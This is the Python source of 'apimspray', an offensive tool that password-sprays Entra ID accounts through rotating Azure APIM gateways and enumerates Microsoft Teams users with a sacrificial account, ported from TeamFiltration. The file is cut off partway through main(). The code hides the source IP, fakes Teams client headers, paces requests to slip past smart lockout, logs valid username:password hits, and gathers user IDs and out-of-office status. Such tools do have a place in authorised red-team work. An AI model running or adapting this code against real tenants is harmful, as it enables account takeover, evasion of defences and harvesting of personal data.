#!/usr/bin/env python3
"""
apimspray - Entra ID Auth Assessment Toolkit via APIM Gateways
Enhanced with Microsoft Teams user enumeration (inspired by TeamFiltration)
"""

import argparse
import os
import sys
import time
import uuid
import random
import threading
import json
import re
import requests
import itertools
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime, timezone
from urllib.parse import urlparse

# --- Configuration & Constants ---

VERSION = "3.0.0"

# Terminal Colors
USE_COLOR = sys.stdout.isatty() and not os.getenv("NO_COLOR")

class TermColors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"

# Pacing configurations (spray / validate)
PACE_SETTINGS = {
    "high": {"workers": 15, "delay": 0.1, "count": 10, "lockout": 5, "safe": 20, "jitter": 0},
    "medium": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
    "mid": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
    "low": {"workers": 2, "delay": 5, "count": 2, "lockout": 15, "safe": 5, "jitter": 20},
    "stealth": {"workers": 1, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
}

# Enumerate pacing (separate from spray — enum is read-only, no lockout risk)
# TeamFiltration uses maxDegreeOfParallelism: 300 with no delays
ENUM_PACE_SETTINGS = {
    "high": {"workers": 100, "delay": 0, "jitter": 0},
    "medium": {"workers": 50, "delay": 0, "jitter": 0},
    "mid": {"workers": 50, "delay": 0, "jitter": 0},
    "low": {"workers": 20, "delay": 0.1, "jitter": 0},
    "stealth": {"workers": 5, "delay": 1, "jitter": 20},
}

# Smart Lockout
LOCKOUT_WAIT_SECONDS = 65
SMART_LOCKOUT_ERROR = "AADSTS50053"
USER_NOT_FOUND_ERROR = "AADSTS50034"

# User Agents (Windows 11)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.37 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.38 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.38",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/144.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/145.0.0.0"
]

# Client Apps (ClientId, Resource, Scope)
CLIENT_APPS = [
    {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile offline_access"
    },
    {
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "resource": "https://graph.windows.net",
        "scope": "openid profile"
    },
    {
        "client_id": "00000002-0000-0ff1-ce00-000000000000",
        "resource": "https://outlook.office365.com",
        "scope": "openid profile"
    },
    {
        "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile"
    }
]

# Teams-specific client config for sacrificial account auth
TEAMS_CLIENT_CONFIG = {
    "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "resource": "https://api.spaces.skype.com/",
    "scope": "openid profile"
}

# Teams API regions
TEAMS_REGIONS = ["amer", "emea", "apac"]
DEFAULT_TEAMS_REGION = "amer"

# Teams client headers (mimics Android Teams app, same as TeamFiltration)
TEAMS_CLIENT_HEADERS = {
    "x-ms-client-caller": "x-ms-client-caller",
    "x-ms-client-version": "27/1.0.0.2021011237",
    "Referer": "https://teams.microsoft.com/_",
    "ClientInfo": "os=Android; osVer=7.1.2; proc=x86; lcid=en-US; deviceType=2; country=US; clientName=microsoftteams; clientVer=1416/1.0.0.2021012201; utcOffset=+01:00"
}

# AADSTS Codes
AADSTS_REGEX = re.compile(r'(AADSTS\d+)')
AADSTS_MAP = {
    "AADSTS50053": "LOCKED (Smart Lockout)",
    "AADSTS50055": "VALID (Password Expired)",
    "AADSTS50057": "BLOCKED (Account Disabled)",
    "AADSTS50126": "FAILED (Invalid Creds)",
    "AADSTS50034": "FAILED (User Not Found)",
    "AADSTS50059": "FAILED (Tenant Not Found)",
    "AADSTS50128": "FAILED (Invalid Domain)",
    "AADSTS50076": "VALID (MFA Required)",
    "AADSTS50079": "VALID (MFA Required)",
    "AADSTS50158": "VALID (Conditional Access)",
    "AADSTS53003": "VALID (Conditional Access Blocked)",
    "AADSTS53000": "BLOCKED (Policy)",
    "AADSTS50105": "BLOCKED (Not Assigned)",
    "AADSTS500011": "VALID (Invalid Resource)",
    "AADSTS700016": "VALID (Invalid ClientID)",
    "AADSTS50000": "ERROR (Token Issue)",
}

# --- Classes ---

class Target:
    def __init__(self, username, password=None):
        self.username = username
        self.password = password

class APIMManager:
    def __init__(self, urls):
        self.urls = urls
        self.lock = threading.Lock()
        self._pool = []
        self._last_url = None

    def get_next_url(self):
        """Returns the next APIM URL, cycling through a shuffled pool."""
        with self.lock:
            if not self.urls:
                raise ValueError("No APIM URLs available.")
            if len(self.urls) == 1:
                return self.urls[0]
            if not self._pool:
                self._pool = list(self.urls)
                random.shuffle(self._pool)
                if self._last_url and self._pool[0] == self._last_url and len(self._pool) > 1:
                    self._pool[0], self._pool[1] = self._pool[1], self._pool[0]
            next_url = self._pool.pop(0)
            self._last_url = next_url
            return next_url

class TeamsAPIMManager:
    """Manages APIM URLs specifically configured for Teams API proxying."""
    def __init__(self, urls):
        self.urls = urls
        self.lock = threading.Lock()
        self._pool = []
        self._last_url = None

    def get_next_url(self):
        """Returns the next Teams APIM URL, cycling through a shuffled pool."""
        with self.lock:
            if not self.urls:
                raise ValueError("No Teams APIM URLs available.")
            if len(self.urls) == 1:
                return self.urls[0]
            if not self._pool:
                self._pool = list(self.urls)
                random.shuffle(self._pool)
                if self._last_url and self._pool[0] == self._last_url and len(self._pool) > 1:
                    self._pool[0], self._pool[1] = self._pool[1], self._pool[0]
            next_url = self._pool.pop(0)
            self._last_url = next_url
            return next_url

class Logger:
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.timestamp = int(datetime.now(timezone.utc).timestamp())
        self.run_dir = self.output_dir / str(self.timestamp)
        self.run_dir.mkdir(parents=True, exist_ok=True)
        
        self.files = {
            "valid": self.run_dir / f"valid_{self.timestamp}.txt",
            "blocked": self.run_dir / f"blocked_{self.timestamp}.txt",
            "failed": self.run_dir / f"failed_{self.timestamp}.txt",
            "enumerated": self.run_dir / f"enumerated_{self.timestamp}.txt",
            "enum_details": self.run_dir / f"enum_details_{self.timestamp}.json",
        }
        self.locks = {k: threading.Lock() for k in self.files}

    def log_result(self, result_type, file_message, console_message=None):
        """Logs result to file and console."""
        if result_type not in self.files:
            return
        if console_message:
            print(console_message)
        with self.locks[result_type]:
            with open(self.files[result_type], "a", encoding="utf-8") as f:
                f.write(f"{utc_now_str()} | {file_message}\n")

    def log_enum_detail(self, detail_dict):
        """Appends a JSON object to the enum details file (one JSON object per line)."""
        with self.locks["enum_details"]:
            with open(self.files["enum_details"], "a", encoding="utf-8") as f:
                f.write(json.dumps(detail_dict) + "\n")

class ProgressTracker:
    """Thread-safe progress tracker that prints status when the user hits Enter."""

    def __init__(self):
        self._total = 0
        self._completed = 0
        self._label = "Spraying"
        self._lock = threading.Lock()
        self._start_time = None
        self._stop_event = threading.Event()
        self._listener_thread = None
        self._active = False
        self._global_total = 0
        self._global_completed = 0
        self._global_start_time = None

    def begin_session(self, overall_total):
        self._global_total = overall_total
        self._global_completed = 0
        self._global_start_time = time.monotonic()
        self._stop_event.clear()
        self._active = True
        if sys.stdin.isatty():
            self._listener_thread = threading.Thread(target=self._listen_loop, daemon=True)
            self._listener_thread.start()

    def end_session(self):
        self._stop_event.set()
        self._active = False
        if self._listener_thread:
            # Don't join — the daemon thread will die with the process.
            # Joining a thread blocked on stdin.readline() can hang indefinitely.
            self._listener_thread = None

    def begin_round(self, total, label="Spraying"):
        with self._lock:
            self._total = total
            self._completed = 0
            self._label = label
            self._start_time = time.monotonic()

    def end_round(self):
        with self._lock:
            self._global_completed += self._completed

    def increment(self, n=1):
        with self._lock:
            self._completed += n

    def _listen_loop(self):
        """Background thread: waits for Enter key, prints progress on demand.
        Uses select() with the stop event pipe so it can be interrupted cleanly."""
        while not self._stop_event.is_set():
            try:
                ready = _stdin_ready(timeout=0.5)
                if self._stop_event.is_set():
                    break
                if ready:
                    try:
                        sys.stdin.readline()
                    except (OSError, ValueError):
                        break
                    if self._active and not self._stop_event.is_set():
                        self._print_progress()
            except Exception:
                break

    def _print_progress(self):
        if not sys.stdout.isatty():
            return
        with self._lock:
            r_completed = self._completed
            r_total = self._total
            r_elapsed = time.monotonic() - self._start_time if self._start_time else 0
            g_completed = self._global_completed + r_completed
            g_total = self._global_total
            g_elapsed = time.monotonic() - self._global_start_time if self._global_start_time else 0
            label = self._label
        if r_total == 0:
            return
        r_pct = (r_completed / r_total) * 100.0
        r_rate = r_completed / r_elapsed if r_elapsed > 0 else 0.0
        r_eta = _format_duration((r_total - r_completed) / r_rate) if r_rate > 0 and r_completed < r_total else ("done" if r_completed >= r_total else "...")
        g_pct = (g_completed / g_total) * 100.0 if g_total > 0 else 0.0
        g_rate = g_completed / g_elapsed if g_elapsed > 0 else 0.0
        g_eta = _format_duration((g_total - g_completed) / g_rate) if g_rate > 0 and g_completed < g_total else ("done" if g_completed >= g_total else "...")
        bar_width = 20
        filled = int(bar_width * r_completed / r_total) if r_total > 0 else 0
        bar = "\u2588" * filled + "\u2591" * (bar_width - filled)
        separator = style("\u2500" * 60, TermColors.DIM)
        round_line = (
            f"  {style(label, TermColors.CYAN, TermColors.BOLD)} "
            f"[{bar}] "
            f"{style(f'{r_pct:5.1f}%', TermColors.BOLD)} "
            f"({r_completed}/{r_total}) "
            f"| {r_rate:.1f} req/s "
            f"| ETA: {r_eta}"
        )
        global_line = (
            f"  {style('Overall', TermColors.MAGENTA, TermColors.BOLD)}  "
            f"{style(f'{g_pct:5.1f}%', TermColors.BOLD)} "
            f"({g_completed}/{g_total}) "
            f"| Elapsed: {_format_duration(g_elapsed)} "
            f"| ETA: {g_eta} "
            f"| {g_rate:.1f} req/s"
        )
        hint = style("  (press Enter again for updated progress)", TermColors.DIM)
        print(f"\n{separator}")
        print(round_line)
        print(global_line)
        print(f"{separator}{hint}\n", flush=True)

def _stdin_ready(timeout=0.5):
    import select
    try:
        ready, _, _ = select.select([sys.stdin], [], [], timeout)
        return bool(ready)
    except (ValueError, OSError):
        time.sleep(timeout)
        return False

def _format_duration(seconds):
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        m, s = divmod(seconds, 60)
        return f"{m}m{s:02d}s"
    else:
        h, remainder = divmod(seconds, 3600)
        m, s = divmod(remainder, 60)
        return f"{h}h{m:02d}m{s:02d}s"

# --- Helper Functions ---

def style(text, *styles):
    if not USE_COLOR or not styles:
        return text
    return f"{''.join(styles)}{text}{TermColors.RESET}"

def utc_now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def print_info(message):
    prefix = style("[*]", TermColors.CYAN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_warn(message):
    prefix = style("[!]", TermColors.YELLOW, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_success(message):
    prefix = style("[+]", TermColors.GREEN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_error(message):
    prefix = style("[x]", TermColors.RED, TermColors.BOLD)
    print(f"{prefix} {message}")

def format_result_line(timestamp, target, classification):
    ts = style(f"[{timestamp}]", TermColors.DIM)
    creds = f"{target.username}:{target.password}"
    if classification.startswith("VALID"):
        creds = style(creds, TermColors.GREEN, TermColors.BOLD)
        status = style(classification, TermColors.GREEN, TermColors.BOLD)
    elif classification.startswith("LOCKED") or classification.startswith("BLOCKED"):
        creds = style(creds, TermColors.YELLOW, TermColors.BOLD)
        status = style(classification, TermColors.YELLOW, TermColors.BOLD)
    elif classification.startswith("FAILED"):
        creds = style(creds, TermColors.RED)
        status = style(classification, TermColors.RED)
    else:
        status = style(classification, TermColors.MAGENTA)
    return f"{ts} {creds} | {status}"

def wait_with_countdown(seconds, allow_skip):
    if seconds <= 0:
        return False
    skip_event = threading.Event()
    if allow_skip and sys.stdin.isatty():
        t = threading.Thread(target=_wait_for_enter, args=(skip_event,), daemon=True)
        t.start()
    if not sys.stdout.isatty():
        time.sleep(seconds)
        return skip_event.is_set()
    for remaining in range(seconds, 0, -1):
        line = f"    Waiting {remaining}s to retry"
        if allow_skip and sys.stdin.isatty():
            line += " (press Enter to skip)"
        print(f"\r{line}", end="", flush=True)
        if skip_event.is_set():
            break
        time.sleep(1)
    print("\033[2K\r", end="", flush=True)
    print()
    return skip_event.is_set()

def _wait_for_enter(event):
    try:
        sys.stdin.readline()
    except Exception:
        return
    event.set()

def load_file_lines(path):
    p = Path(path)
    if not p.exists():
        return []
    with open(p, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def normalize_users(users, domain):
    normalized = []
    for u in users:
        if "@" in u:
            if domain:
                user_part = u.split("@")[0]
                normalized.append(f"{user_part}@{domain}")
            else:
                normalized.append(u)
        else:
            if domain:
                normalized.append(f"{u}@{domain}")
            else:
                normalized.append(u)
    return normalized

def parse_aadsts(text):
    match = AADSTS_REGEX.search(text)
    if match:
        return match.group(1)
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None
    if isinstance(payload, dict):
        codes = payload.get("error_codes") or payload.get("errorCodes") or []
        if isinstance(codes, list) and codes:
            return f"AADSTS{codes[0]}"
        description = payload.get("error_description", "")
        match = AADSTS_REGEX.search(description)
        if match:
            return match.group(1)
    return None

def get_status_from_aadsts(code):
    return AADSTS_MAP.get(code, "UNKNOWN")

def has_access_token(text):
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return "access_token" in text
    return isinstance(payload, dict) and "access_token" in payload

def build_file_message(target, aadsts, classification, gateway_url):
    aadsts_display = aadsts or "No Code"
    gateway_host = urlparse(gateway_url).netloc
    return f"{target.username}:{target.password} | {aadsts_display} | {classification} | APIM: {gateway_host}"


# ============================================================================
# TEAMS ENUMERATION VIA APIM (ported from TeamFiltration)
# ============================================================================

class TeamsEnumerator:
    """
    Enumerates valid Microsoft Teams users by leveraging a sacrificial O365 account.
    Routes all API traffic through APIM gateways for IP rotation.

    Flow:
      1. Authenticate sacrificial account via APIM -> get Teams bearer token
      2. Exchange bearer token for Skype token via authsvc.teams.microsoft.com
      3. For each candidate email, hit the Teams externalsearchv3 endpoint
         (routed through Teams APIM gateways) to determine if the user exists
      4. Optionally fetch user presence/out-of-office info
    """

    def __init__(self, login_apim_manager, teams_apim_manager, region=DEFAULT_TEAMS_REGION):
        self.login_apim_manager = login_apim_manager
        self.teams_apim_manager = teams_apim_manager
        self.region = region
        self.bearer_token = None
        self.skype_token = None
        self._lock = threading.Lock()
        self._reauth_lock = threading.Lock()
        # Stored for mid-run re-authentication on token expiry
        self._sac_user = None
        self._sac_pass = None
        self._tenant = "common"

    def _get_base_headers(self):
        """Construct base headers mimicking the Teams Android client."""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        headers.update(TEAMS_CLIENT_HEADERS)
        return headers

    def _get_auth_headers(self):
        """Construct headers with bearer + skype tokens for Teams API calls."""
        headers = self._get_base_headers()
        if self.bearer_token:
            headers["Authorization"] = f"Bearer {self.bearer_token}"
        if self.skype_token:
            headers["Authentication"] = f"skypetoken={self.skype_token}"
            headers["X-Skypetoken"] = self.skype_token
        return headers

    def authenticate_sacrificial(self, username, password, tenant="common"):
        """
        Authenticate the sacrificial account through APIM to get a Teams bearer token.
        Uses the Teams client_id targeting the Skype API resource.
        """
        # Store for mid-run re-authentication
        self._sac_user = username
        self._sac_pass = password
        self._tenant = tenant

        gateway_url = self.login_apim_manager.get_next_url()
        if not gateway_url.endswith("/"):
            gateway_url += "/"

        full_url = f"{gateway_url}common/oauth2/token"

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "client-request-id": str(uuid.uuid4()),
            "return-client-request-id": "true"
        }

        data = {
            "grant_type": "password",
            "resource": TEAMS_CLIENT_CONFIG["resource"],
            "client_id": TEAMS_CLIENT_CONFIG["client_id"],
            "scope": TEAMS_CLIENT_CONFIG["scope"],
            "username": username,
            "password": password,
        }

        try:
            resp = requests.post(full_url, headers=headers, data=data, timeout=30, verify=True)
            if resp.status_code == 200:
                token_data = resp.json()
                if "access_token" in token_data:
                    self.bearer_token = token_data["access_token"]
                    print_success("Sacrificial account authenticated via APIM -- Teams bearer token acquired")
                    return True
                else:
                    print_error(f"Auth response missing access_token: {resp.text[:200]}")
                    return False
            else:
                aadsts = parse_aadsts(resp.text)
                status = get_status_from_aadsts(aadsts) if aadsts else f"HTTP {resp.status_code}"
                print_error(f"Sacrificial account auth failed: {status}")
                if aadsts:
                    print_error(f"AADSTS Code: {aadsts}")
                return False
        except requests.RequestException as e:
            print_error(f"Sacrificial account auth request failed: {e}")
            return False

    def acquire_skype_token(self):
        """
        Exchange the Teams bearer token for a Skype token.
        This call goes DIRECTLY to authsvc.teams.microsoft.com (no APIM needed;
        this is a one-time call that does not reveal target info).
        """
        if not self.bearer_token:
            print_error("No bearer token available -- authenticate first")
            return False

        url = "https://authsvc.teams.microsoft.com/v1.0/authz"
        headers = self._get_base_headers()
        headers["Authorization"] = f"Bearer {self.bearer_token}"

        try:
            resp = requests.post(url, headers=headers, json={}, timeout=30, verify=True)
            if resp.status_code == 200:
                data = resp.json()
                skype_token = data.get("tokens", {}).get("skypeToken")
                if skype_token:
                    self.skype_token = skype_token
                    region_hint = data.get("region", "").lower()
                    if region_hint in TEAMS_REGIONS:
                        self.region = region_hint
                        print_info(f"Teams region detected: {style(self.region.upper(), TermColors.MAGENTA, TermColors.BOLD)}")
                    print_success("Skype token acquired")
                    return True
                else:
                    print_error("Skype token not found in authz response")
                    return False
            else:
                print_error(f"Skype token acquisition failed: HTTP {resp.status_code}")
                try:
                    err_data = resp.json()
                    print_error(f"Error: {err_data.get('message', resp.text[:200])}")
                except Exception:
                    print_error(f"Response: {resp.text[:200]}")
                return False
        except requests.RequestException as e:
            print_error(f"Skype token request failed: {e}")
            return False

    def enumerate_user(self, email, fetch_presence=False, max_retries=3):
        """
        Check if a user exists via the Teams externalsearchv3 endpoint.
        Routes through APIM gateways when available, falls back to direct.

        Retries on transient failures (HTTP 500, 429, timeouts) up to max_retries.
        Detects token expiry (HTTP 401) and signals for re-authentication.
        """
        result = {
            "email": email,
            "valid": False,
            "object_id": None,
            "display_name": None,
            "upn": None,
            "tenant_id": None,
            "mri": None,
            "out_of_office": None,
            "presence": None,
            "gateway": None,
            "error": None,
            "token_expired": False,
        }

        def _build_url():
            if self.teams_apim_manager:
                gw = self.teams_apim_manager.get_next_url()
                if not gw.endswith("/"):
                    gw += "/"
                url = f"{gw}{self.region}/beta/users/{email}/externalsearchv3"
                host = urlparse(gw).netloc
            else:
                url = f"https://teams.microsoft.com/api/mt/{self.region}/beta/users/{email}/externalsearchv3"
                host = "direct"
            return url, host

        enum_url, gw_host = _build_url()
        result["gateway"] = gw_host

        for attempt in range(max_retries + 1):
            # Refresh headers each attempt (picks up new tokens after re-auth)
            headers = self._get_auth_headers()

            try:
                resp = requests.get(enum_url, headers=headers, timeout=15, verify=True)
            except requests.RequestException as e:
                result["error"] = str(e)
                if attempt < max_retries:
                    enum_url, gw_host = _build_url()
                    result["gateway"] = gw_host
                    time.sleep(0.5 * (attempt + 1))
                    continue
                return result

            # Token expired — signal caller to re-auth
            if resp.status_code == 401:
                result["error"] = "HTTP 401 -- token expired"
                result["token_expired"] = True
                return result

            # Rate limited by APIM or Teams — backoff and retry
            if resp.status_code == 429:
                result["error"] = "HTTP 429 -- rate limited"
                if attempt < max_retries:
                    retry_after = 2
                    try:
                        retry_after = int(resp.headers.get("Retry-After", 2))
                    except (ValueError, TypeError):
                        pass
                    enum_url, gw_host = _build_url()
                    result["gateway"] = gw_host
                    time.sleep(min(retry_after, 10))
                    continue
                return result

            if resp.status_code == 200:
                body = resp.text
                if "tenantId" in body:
                    try:
                        users_found = resp.json()
                        if isinstance(users_found, list) and len(users_found) > 0:
                            for user_obj in users_found:
                                tenant_id = user_obj.get("tenantId")
                                coex_mode = (user_obj.get("featureSettings") or {}).get("coExistenceMode", "")
                                display_name = user_obj.get("displayName", "")
                                upn = user_obj.get("userPrincipalName", "")

                                if (
                                    tenant_id is not None
                                    and coex_mode != "Unknown"
                                    and (display_name.lower() != email.lower() or upn.lower() == email.lower())
                                ):
                                    result["valid"] = True
                                    result["object_id"] = user_obj.get("objectId")
                                    result["display_name"] = display_name
                                    result["upn"] = upn
                                    result["tenant_id"] = tenant_id
                                    result["mri"] = user_obj.get("mri")

                                    if fetch_presence:
                                        ooo = self._fetch_presence(user_obj.get("mri"))
                                        if ooo:
                                            result["out_of_office"] = ooo.get("message")
                                            result["presence"] = ooo.get("availability")
                                    return result
                    except (json.JSONDecodeError, KeyError, TypeError):
                        pass
                return result

            elif resp.status_code == 403:
                try:
                    err_body = resp.json()
                    if err_body.get("errorCode") == "Forbidden":
                        result["valid"] = True
                        return result
                except (json.JSONDecodeError, AttributeError):
                    pass
                return result

            elif resp.status_code == 500:
                result["error"] = "HTTP 500 -- server error (transient)"
                if attempt < max_retries:
                    enum_url, gw_host = _build_url()
                    result["gateway"] = gw_host
                    time.sleep(0.5 * (attempt + 1))
                    continue
                return result

            else:
                result["error"] = f"HTTP {resp.status_code}"
                # Retry unknown errors too — could be transient APIM issues
                if attempt < max_retries:
                    enum_url, gw_host = _build_url()
                    result["gateway"] = gw_host
                    time.sleep(0.5)
                    continue
                return result

        return result

    def _fetch_presence(self, mri):
        """
        Fetch user presence and out-of-office status.
        Goes directly to presence.teams.microsoft.com (not proxied;
        this only reveals the MRI, not the candidate list).
        """
        if not mri:
            return None

        headers = self._get_auth_headers()
        headers["Content-Type"] = "application/json"
        url = "https://presence.teams.microsoft.com/v1/presence/getpresence/"
        payload = [{"mri": mri}]

        try:
            resp = requests.post(url, headers=headers, json=payload, timeout=10, verify=True)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and len(data) > 0:
                    presence_obj = data[0].get("presence", {})
                    cal_data = presence_obj.get("calendarData", {})
                    ooo_note = cal_data.get("outOfOfficeNote", {})
                    return {
                        "message": ooo_note.get("message") if ooo_note else None,
                        "availability": presence_obj.get("availability"),
                    }
        except Exception:
            pass
        return None

    def sanity_check(self, sample_domain):
        """
        Verify enumeration works by checking a guaranteed-invalid username.
        If it comes back valid, the method is unreliable for this tenant.
        Returns True if sanity check PASSES (enumeration is usable).
        """
        fake_user = f"ThisUserShouldNotExist_{uuid.uuid4().hex[:8]}@{sample_domain}"
        print_info(f"Running sanity check with: {fake_user}")
        result = self.enumerate_user(fake_user, max_retries=0)
        if result.get("token_expired"):
            print_error("Sanity check got 401 -- token may be invalid for Teams API. Check sacrificial account has a Teams license.")
            return False
        if result.get("error"):
            print_warn(f"Sanity check returned error: {result['error']} -- proceeding anyway")
            return True
        if result["valid"]:
            print_error("Sanity check FAILED -- fake user returned as valid. Enumeration unreliable for this tenant.")
            return False
        else:
            print_success("Sanity check PASSED -- enumeration is viable for this tenant")
            return True


# ============================================================================
# CORE AUTH LOGIC (unchanged from original)
# ============================================================================

def perform_auth(target, gateway_url, tenant, app_config, proxy_dict=None):
    if not gateway_url.endswith("/"):
        gateway_url += "/"
    full_url = f"{gateway_url}common/oauth2/token"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "client-request-id": str(uuid.uuid4()),
        "return-client-request-id": "true"
    }
    data = {
        "grant_type": "password",
        "resource": app_config["resource"],
        "client_id": app_config["client_id"],
        "scope": app_config["scope"],
        "username": target.username,
        "password": target.password
    }
    try:
        resp = requests.post(full_url, headers=headers, data=data, timeout=15, verify=True)
        return resp.status_code, resp.text, parse_aadsts(resp.text)
    except requests.RequestException as e:
        return 0, str(e), None

def process_attempt(
    target, apim_manager, tenant, pace_config, logger,
    locked_users_set, invalid_users_set, lockout_counts,
    lock, continue_on_success, stop_event,
):
    if stop_event.is_set():
        return
    with lock:
        if target.username in locked_users_set or target.username in invalid_users_set:
            return
    app_config = random.choice(CLIENT_APPS)
    gateway_url = apim_manager.get_next_url()
    status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)

    if aadsts == USER_NOT_FOUND_ERROR:
        with lock:
            if target.username not in invalid_users_set:
                invalid_users_set.add(target.username)
                if sys.stdout.isatty():
                    print(f"\r{style('[!]', TermColors.YELLOW, TermColors.BOLD)} User Not Found: {target.username} (Total: {len(invalid_users_set)})", end="", flush=True)

    if aadsts == SMART_LOCKOUT_ERROR:
        is_slow_pace = pace_config["delay"] >= 2
        with lock:
            lockout_counts[target.username] = lockout_counts.get(target.username, 0) + 1
            lockout_count = lockout_counts[target.username]
        user_display = style(target.username, TermColors.RED, TermColors.BOLD)
        classification = get_status_from_aadsts(aadsts)
        file_msg = build_file_message(target, aadsts, classification, gateway_url)
        if lockout_count == 1:
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Skipping wait on first occurrence.")
            logger.log_result("blocked", file_msg)
            return
        if is_slow_pace:
            allow_skip = sys.stdin.isatty()
            skip_note = " Press Enter to skip." if allow_skip else ""
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Waiting {LOCKOUT_WAIT_SECONDS}s to retry.{skip_note}")
            wait_with_countdown(LOCKOUT_WAIT_SECONDS, allow_skip=allow_skip)
            gateway_url = apim_manager.get_next_url()
            status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)
            if aadsts == SMART_LOCKOUT_ERROR:
                with lock:
                    locked_users_set.add(target.username)
                classification = get_status_from_aadsts(aadsts)
                file_msg = build_file_message(target, aadsts, classification, gateway_url)
                logger.log_result("blocked", file_msg)
                return
        else:
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Skipping wait due to pace.")
            logger.log_result("blocked", file_msg)
            return

    classification = "UNKNOWN"
    if aadsts:
        classification = get_status_from_aadsts(aadsts)
    elif status_code == 200 and has_access_token(response_text):
        classification = "VALID (Token)"
    elif status_code == 200:
        classification = "UNKNOWN (200 OK)"
    elif status_code == 0:
        classification = "ERROR (Request Failed)"
    else:
        classification = f"UNKNOWN (HTTP {status_code})"

    timestamp = utc_now_str()
    file_msg = build_file_message(target, aadsts, classification, gateway_url)

    if classification.startswith("VALID"):
        console_msg = format_result_line(timestamp, target, classification)
        logger.log_result("valid", file_msg, console_msg)
    elif classification.startswith("BLOCKED") or classification.startswith("LOCKED"):
        console_msg = format_result_line(timestamp, target, classification)
        logger.log_result("blocked", file_msg, console_msg)
    elif classification.startswith("FAILED"):
        logger.log_result("failed", file_msg)
    else:
        logger.log_result("failed", file_msg)

    is_valid_credential = classification.startswith("VALID") or classification == "BLOCKED (Account Disabled)"
    if is_valid_credential and not continue_on_success:
        print_success("Valid credentials found. Stopping as --continue-on-success is not set.")
        stop_event.set()


# ============================================================================
# ENUMERATE MODE WORKER
# ============================================================================

def process_enum_attempt(
    email, teams_enumerator, pace_config, logger,
    valid_users_set, valid_mris, lock, stop_event,
):
    if stop_event.is_set():
        return
    result = teams_enumerator.enumerate_user(email, fetch_presence=False)

    # Handle token expiry — re-authenticate and retry once
    if result.get("token_expired"):
        # Capture the token that failed
        stale_token = teams_enumerator.bearer_token

        with teams_enumerator._reauth_lock:
            # If the token is still the same stale one, we need to re-auth.
            # If another thread already refreshed it, the tokens won't match — skip.
            if teams_enumerator.bearer_token == stale_token:
                print_warn("Token expired — re-authenticating sacrificial account...")
                teams_enumerator.authenticate_sacrificial(
                    teams_enumerator._sac_user,
                    teams_enumerator._sac_pass,
                    teams_enumerator._tenant,
                )
                teams_enumerator.acquire_skype_token()

        # Retry with fresh token
        result = teams_enumerator.enumerate_user(email, fetch_presence=False)

    if result["valid"]:
        with lock:
            valid_users_set.add(email)
            if result.get("mri"):
                valid_mris[email] = result["mri"]

        print(f"{style('[+]', TermColors.GREEN, TermColors.BOLD)} {style(email, TermColors.GREEN, TermColors.BOLD)}")

        logger.log_result("enumerated", email)
        logger.log_enum_detail({
            "timestamp": utc_now_str(),
            "email": email,
            "valid": True,
            "object_id": result.get("object_id"),
            "tenant_id": result.get("tenant_id"),
            "mri": result.get("mri"),
        })


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="apimspray - Entra ID Assessment Tool (with Teams Enumeration)",
        formatter_class=argparse.RawTextHelpFormatter
    )
